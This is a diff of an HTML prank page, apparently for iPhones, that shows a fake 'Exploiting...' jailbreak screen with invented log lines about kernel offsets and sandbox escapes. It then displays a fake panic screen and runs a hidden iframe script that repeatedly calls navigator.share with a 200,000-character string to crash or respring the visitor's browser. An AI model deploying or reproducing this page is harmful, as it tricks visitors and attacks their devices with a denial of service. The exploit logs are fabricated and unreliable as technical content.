@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jailbreak in Progress</title>
+    <title>Exploiting...</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -15,67 +15,104 @@
 
         @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
+        /* ХОЛСТ ДЛЯ ДОЖДЯ */
+        #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+
         .main-card {
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; padding: 30px;
-            width: 85%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 35px; padding: 35px 25px;
+            width: 85%; max-width: 380px; text-align: center; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            z-index: 10; position: relative;
         }
 
-        h1 { font-size: 1.6rem; margin: 0 0 15px 0; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        h1 {
+            font-size: 1.8rem; margin: 0 0 20px 0; letter-spacing: -1px;
+            background: linear-gradient(to bottom, #fff, #999); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
 
         .progress-container { background: rgba(255, 255, 255, 0.1); border-radius: 10px; height: 6px; width: 100%; margin-bottom: 20px; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
 
         #console {
-            background: rgba(0, 0, 0, 0.4); border-radius: 15px; padding: 12px; height: 180px;
-            font-family: 'Courier New', Courier, monospace; font-size: 10px; color: #00ff00;
-            text-align: left; overflow: hidden; border: 1px solid rgba(0, 255, 0, 0.1);
+            background: rgba(0, 0, 0, 0.45); border-radius: 20px; padding: 15px; height: 180px;
+            font-family: 'SF Mono', 'Courier New', monospace; font-size: 10px; color: #32d74b;
+            text-align: left; overflow: hidden; border: 1px solid rgba(50, 215, 75, 0.15);
         }
 
-        .line { margin-bottom: 3px; opacity: 0; animation: fadeIn 0.1s forwards; }
+        .line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.1s forwards; }
         @keyframes fadeIn { to { opacity: 1; } }
 
-        /* Экран мгновенной смерти */
+        /* Мгновенная паника */
         #panic-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #ff3b30; color: #fff; font-size: 8px; word-break: break-all;
             padding: 0; z-index: 1000; overflow: hidden;
         }
 
-        .credits { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 9px; color: #555; z-index: 200; }
+        .footer { margin-top: 30px; font-size: 10px; color: #444; }
         #respring-iframe { position: fixed; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
 
+    <canvas id="rainCanvas"></canvas>
+
     <div id="terminal" class="main-card">
-        <h1>Exploiting System...</h1>
+        <h1>Exploiting...</h1>
         <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
         <div id="console"></div>
+        <div class="footer">© 2026 neonmodder123</div>
     </div>
 
     <div id="panic-screen"></div>
-
-    <div class="credits">© 2026 <b>neonmodder123</b> | MIT License</div>
-
     <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
     <script>
+        // --- ЛОГИКА ДОЖДЯ (ТАК ЖЕ МАЛО, КАК НА ПЕРВОЙ) ---
+        const canvas = document.getElementById('rainCanvas');
+        const ctx = canvas.getContext('2d');
+        let width, height, drops;
+
+        function initRain() {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+            drops = [];
+            const count = Math.floor(width / 12); 
+            for (let i = 0; i < count; i++) {
+                drops.push({
+                    x: Math.random() * width, y: Math.random() * height,
+                    len: Math.random() * 30 + 15, speed: Math.random() * 3 + 2,
+                    op: Math.random() * 0.15 + 0.05
+                });
+            }
+        }
+
+        function drawRain() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
+            ctx.fillRect(0, 0, width, height);
+            ctx.strokeStyle = '#1ad2dc';
+            ctx.lineWidth = 1;
+            drops.forEach(d => {
+                ctx.globalAlpha = d.op;
+                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.len); ctx.stroke();
+                d.y += d.speed;
+                if (d.y > height) { d.y = -d.len; d.x = Math.random() * width; }
+            });
+            requestAnimationFrame(drawRain);
+        }
+
+        // --- ЛОГИКА ТЕРМИНАЛА ---
         const logs = [
-            "> Initializing exploit daemon...",
-            "> Fetching kernel slide...",
+            "> Initializing exploit...",
             "> Slide: 0x412b000000",
             "> Bypassing KPP/KTRR...",
-            "> Remounting RootFS (RW)...",
-            "> Success. Escaping sandbox...",
+            "> Remounting RootFS...",
             "> Gaining TFP0 port...",
-            "> Found offset: 0xfffffff007004000",
-            "> Patching amfi_signatures...",
+            "> Found offset: 0xfffffff007",
+            "> Patching amfi...",
             "> Injecting bootstrap...",
-            "> Mapping I/O surfaces...",
-            "> Overwriting memory at 0x1c3a0...",
-            "> [CRITICAL] WebKit memory leak!",
-            "> Triggering emergency panic..."
+            "> [CRITICAL] WebKit leak!",
+            "> Triggering panic..."
         ];
 
         let barWidth = 0;
@@ -83,7 +120,6 @@
         const consoleEl = document.getElementById('console');
         const panicScreen = document.getElementById('panic-screen');
 
-        // Полоска за 2 секунды
         const loadInterval = setInterval(() => {
             barWidth += 1;
             bar.style.width = barWidth + "%";
@@ -97,25 +133,17 @@
                 div.innerText = logs[index];
                 consoleEl.appendChild(div);
                 consoleEl.scrollTop = consoleEl.scrollHeight;
-                setTimeout(() => startLogs(index + 1), 100);
+                setTimeout(() => startLogs(index + 1), 120);
             } else {
-                // МГНОВЕННЫЙ ПЕРЕХОД
                 triggerInstantPanic();
             }
         }
 
         function triggerInstantPanic() {
-            // Заполняем экран текстом заранее (невидимо)
             let trapText = "";
-            for(let i=0; i<2000; i++) {
-                trapText += "FATAL_ERR:0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
-            }
+            for(let i=0; i<1500; i++) trapText += "FATAL_ERR:0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
             panicScreen.innerText = trapText;
-            
-            // Показываем экран и СРАЗУ запускаем тяжелый скрипт
             panicScreen.style.display = 'block';
-            
-            // Нулевая задержка перед респрингом
             setTimeout(executeRespring, 10);
         }
 
@@ -132,13 +160,14 @@
                 }
                 setInterval(() => {
                     try { navigator.share({title:'R', text:'R'.repeat(200000)}); } catch(e){}
-                    let x = new Uint8Array(1024 * 1024 * 40); // Увеличил нагрузку на ОЗУ
-                    crypto.getRandomValues(x);
                 }, 0);
             <\/script></body></html>`;
         }
 
-        window.onload = () => startLogs(0);
+        window.addEventListener('resize', initRain);
+        initRain();
+        drawRain();
+        startLogs(0);
     </script>
 </body>
 </html>
